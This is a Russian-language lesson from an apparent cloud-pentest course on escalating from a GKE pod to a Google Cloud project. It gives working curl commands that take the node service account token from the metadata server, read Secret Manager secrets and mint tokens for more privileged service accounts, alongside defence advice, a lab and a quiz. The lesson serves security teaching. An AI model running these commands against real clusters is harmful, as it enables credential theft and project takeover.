---
id: cloud-gcp-gke
title: "GKE: Workload Identity, node SA и захват метаданных пода"
category: cloud
parent: cloud-gcp-data-deep
difficulty: hard
order: 3
tags: [cloud, gcp, gke, kubernetes, workload-identity, metadata, service-account]
prerequisites: [cloud-gcp-data-deep, cloud-kubernetes-rbac]
useful_for:
  - "Пентест Google Kubernetes Engine"
  - "Захват токена сервисного аккаунта из пода"
  - "Lateral movement от пода к проекту GCP"
estimated_minutes: 50
summary: "GKE: node service account, Workload Identity и metadata-сервер пода. Как из контейнера получить токен GCP, перечислить права и эскалировать в проект."
---

## Зачем этот урок

GKE — управляемый Kubernetes в GCP, и он же самая частая точка входа в проект. Причина в архитектуре: по умолчанию под получает доступ к metadata-серверу GCP, который выдаёт токен **node service account** — аккаунта, под которым работают узлы кластера. Если Workload Identity не настроен или настроен слабо, этот токен имеет права на весь проект. Из пода можно перечислить бакеты, секреты, другие сервисные аккаунты и часто эскалировать до полного контроля.

## Модель GKE и Workload Identity

- **Node pool** — группа узлов. У узлов есть node service account (по умолчанию `PROJECT_NUMBER-compute@developer.gserviceaccount.com`).
- **Workload Identity** — механизм, позволяющий поду «притворяться» отдельным GCP service account через Kubernetes ServiceAccount (KSA), привязанный к GSA. Без него под видит node SA.
- **Metadata server** — `http://metadata.google.internal` (169.254.169.254). Отдаёт токен через `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` с заголовком `Metadata-Flavor: Google`.
- **GKE metadata server** — при включённом Workload Identity запросы идут через DaemonSet `gke-metadata-server`, который выдаёт токен именно того KSA/GSA.

Проверка: если `curl` к metadata возвращает токен, у которого `email` — это node SA (вида `...-compute@developer.gserviceaccount.com`), Workload Identity не изолирует под. Если email — это конкретный GSA, изоляция работает.

## Инструменты и команды

```bash
# Внутри пода: получаем токен
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq .
# {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}

# Чей это аккаунт
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# 1234567890-compute@developer.gserviceaccount.com

# Используем токен
export TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/oauth2/v1/userinfo | jq .
gcloud auth activate-service-account --access-token-file=<(echo "$TOKEN") 2>/dev/null
# Либо работать напрямую через REST
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects" | jq '.projects[].projectId'
```

Инструменты: `gcloud`, `gcloud container clusters get-credentials`, `kubectl`, `gke-gcloud-auth-plugin`, `gcp_enum`/`gcpwn` для автоматизации.

## Разобранный пример: от пода к секретам проекта

Сценарий: мы внутри пода GKE без Workload Identity.

```bash
# 1. Токен node SA
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

# 2. Какие права (тестируем через IAM testIamPermissions)
curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
  -d '{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}'
# {"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}

# 3. Список бакетов
curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID" \
  | jq -r '.items[].name'
# prod-backups
# app-assets

# 4. Читаем секреты
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets?pageSize=50" | jq -r '.secrets[].name'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets/db-password/versions/latest:access" | jq -r .payload.data | base64 -d
```

Наличие `iam.serviceAccounts.actAs` — ключ к эскалации: можно имперсонировать любой SA (`gcloud iam service-accounts impersonate`), включая owner проекта.

## Чек-лист атаки

1. Получить токен из metadata; узнать email.
2. `testIamPermissions` по ключевым наборам (storage, secretmanager, compute, iam).
3. Если есть `iam.serviceAccounts.actAs` — имперсонировать более привилегированный SA.
4. Если есть `secretmanager.versions.access` — читать секреты.
5. Проверить node SA на `roles/editor`/`roles/owner` (частая ошибка).
6. Проверить другие поды: иногда есть SA с `roles/container.admin`.
7. Проверить, можно ли создать под с нужным KSA/GSA (RBAC).

## Обход защит и edge cases

- **Workload Identity.** Если включён, токен ограничен GSA пода. Но если под использует KSA с широким GSA — эффект тот же. Ищите `serviceAccountName` в манифестах.
- **Metadata concealment / gke-metadata-server.** Иногда поды идут через прокси metadata; всё равно выдаёт токен, но правильный.
- **Network policy.** Может блокировать egress к metadata? Обычно нет — metadata доступен локально (169.254.169.254), network policy его не всегда покрывает.
- **Node SA scopes.** Даже если SA широкий, OAuth scopes узла могут ограничивать. Проверяйте `--scopes` node pool (по умолчанию часто `cloud-platform`).
- **Autopilot.** В Autopilot Workload Identity включён по умолчанию, но SA могут быть широкими.
- **Shielded nodes / binary authorization.** Влияют на запуск образов, не на metadata.

## Частые ошибки и подводные камни

- Считать, что GKE защищён, потому что это managed-сервис: node SA часто имеет `roles/editor`.
- Забыть проверить `actAs` — это прямой путь к эскалации.
- Игнорировать OAuth scopes узла.
- Не проверить KSA/GSA mapping в других namespace.
- Путать `roles/editor` (широкие права, кроме IAM) с `roles/owner`.

## Защита и детект

- Включить Workload Identity и использовать отдельный минимальный GSA на под.
- Не давать node SA `roles/editor`/`roles/owner`; использовать minimal scopes (`--scopes=...`).
- Запретить `iam.serviceAccounts.actAs` на широкий scope; использовать `iam.workloadIdentityUser` binding.
- Включить GKE audit logs, Cloud Audit Logs для IAM/secretmanager; алертить на `SetIamPolicy` и `AccessSecretVersion`.
- Ограничить создание подов с произвольным KSA через admission-политики.

## Модель угроз и типовые мисконфиги

Главный мисконфиг — node SA с `roles/editor` и отключённый Workload Identity. Второй — под с KSA, привязанным к слишком широкому GSA. Третий — `actAs` на `*`. Четвёртый — секреты, доступные node SA. Пятый — отсутствие audit-логов. Все они превращают компрометацию одного пода в компрометацию проекта.

## Практическое задание

1. Создайте GKE-кластер без Workload Identity и под; получите токен node SA.
2. Проверьте `testIamPermissions` и перечислите бакеты.
3. Включите Workload Identity, привяжите KSA к GSA с минимальными правами и повторите — убедитесь, что токен ограничен.
4. Настройте audit-логи и найдите свои вызовы.

## Что дальше / решение

Из пода GKE получаем токен GCP. Дальше — перечислить права, прочитать секреты, имперсонировать SA. Зафиксируйте путь «под → токен → секреты/эскалация» в графе. Если Workload Identity изолирует и прав мало — ищите другие поды/namespace с более широким GSA или эскалируйте внутри кластера.

## Разобранный пример 2: actAs и имперсонация сервисного аккаунта

Право `iam.serviceAccounts.actAs` на конкретный SA или на `*` — прямой путь к эскалации: вы можете выпускать токены от имени другого SA, включая тот, у которого `roles/owner`.

```bash
# Проверяем actAs
curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
  -d '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken"]}'
# {"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken"]}

# Список сервисных аккаунтов
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts" | jq -r '.accounts[].email'
# ci-runner@PROJECT_ID.iam.gserviceaccount.com
# terraform@PROJECT_ID.iam.gserviceaccount.com
# PROJECT_NUMBER-compute@developer.gserviceaccount.com

# Выпускаем токен от имени более привилегированного SA
curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/terraform@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r .accessToken
```

Полученный токен `terraform@` часто имеет `roles/editor` или даже `roles/owner`. Через `gcloud auth activate-service-account` или REST вы работаете уже от его имени. Если у аккаунта есть `iam.serviceAccounts.getAccessToken` и `actAs` на `*`, вы можете «прыгать» по цепочке SA до самого привилегированного.

## Практическое задание (продвинутое)

1. В поде GKE получите токен node SA и проверьте `testIamPermissions` для `actAs`.
2. Создайте GSA `ci-runner` с `roles/editor`, привяжите к KSA и запустите под.
3. Имперсонируйте `ci-runner` через `gcloud iam service-accounts impersonate` и убедитесь, что права расширились.
4. Включите Workload Identity и ограничьте GSA — повторите и убедитесь, что эскалация не проходит.

## Квиз

```quiz
- question: "Чей токен получает под GKE без Workload Identity?"
  options:
    - "Node service account узла кластера"
    - "Личный аккаунт разработчика"
    - "GSA конкретного пода"
    - "Токен Cloud SQL"
  answer: 0
  explanation: "Без Workload Identity под видит node SA через metadata-сервер."
- question: "Какое право открывает имперсонацию сервисных аккаунтов?"
  options:
    - "iam.serviceAccounts.actAs"
    - "storage.buckets.list"
    - "logging.logs.list"
    - "compute.instances.list"
  answer: 0
  explanation: "actAs позволяет действовать от имени другого SA."
- question: "Зачем проверять OAuth scopes узла?"
  options:
    - "Они могут ограничивать API, доступные даже широкому SA"
    - "Они шифруют диск"
    - "Они меняют регион"
    - "Они удаляют кластер"
  answer: 0
  explanation: "Даже с roles/editor узел с узкими scopes не вызовет часть API."
- question: "Как называется механизм изоляции SA на под в GKE?"
  options:
    - "Workload Identity"
    - "Cloud IAP"
    - "VPC-SC"
    - "Binary Authorization"
  answer: 0
  explanation: "Workload Identity связывает KSA с GSA и выдаёт токен именно этого GSA."
```

## Где пригодится

- **Пентест GCP:** вход в проект через под GKE.
- **Red team:** lateral movement из кластера.
- **Cloud IR:** анализ злоупотребления SA.
- **Сертификация:** Google Cloud Security.
